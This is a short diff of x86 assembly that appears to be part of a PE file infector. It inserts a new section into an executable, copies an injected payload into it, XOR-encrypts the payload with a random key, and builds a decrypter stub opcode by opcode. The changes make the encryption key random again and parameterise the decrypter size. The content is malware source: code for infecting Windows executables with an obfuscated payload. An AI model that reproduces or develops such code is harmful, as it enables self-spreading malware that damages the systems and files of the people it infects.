@@ -467,10 +467,9 @@ mov	[DELTA PeFileMap], eax
 mov	eax, 255 ; Maximum xoring
 call	random
 mov	edx, eax
-mov	edx, 42
 
 ; INSERTING NEW SECTION - OPCODE COPY
-mov	ecx, [DELTA NewSectionCodeSize]
+mov	ecx, [DELTA SizeOfRawData]
 mov	edi, [DELTA PeFileMap] ; Destination bytes
 add	edi, [DELTA PointerToRawData]
 mov	esi, toInject ; Source bytes
@@ -504,11 +503,12 @@ xor	eax, edx ; encrypt
 stosd
 
 ; CREATING DECRYPTER
+DECRYPTER_SIZE	=	25
 mov	edi, [DELTA PeFileMap]
 add	edi, [DELTA PointerToRawData]
 mov	eax, 0BFh ; Mov edi
 stosb
-mov	eax, 25 ; Decrypter Size
+mov	eax, DECRYPTER_SIZE ; Decrypter Size
 add	eax, 0400000h ; TODO - Get BA
 add	eax, [DELTA VirtualAddress]
 stosd
@@ -528,11 +528,11 @@ mov	eax, 041h ; inc ecx
 stosb
 mov	eax, 0F981h ; cmp ecx
 stosw
-mov	eax, endInject - toInject - 25
+mov	eax, endInject - toInject - DECRYPTER_SIZE
 stosd
 mov	eax, 075h ; Je
 stosb
-mov	eax, -25 + 9
+mov	eax, -DECRYPTER_SIZE + 9
 stosb
 
 
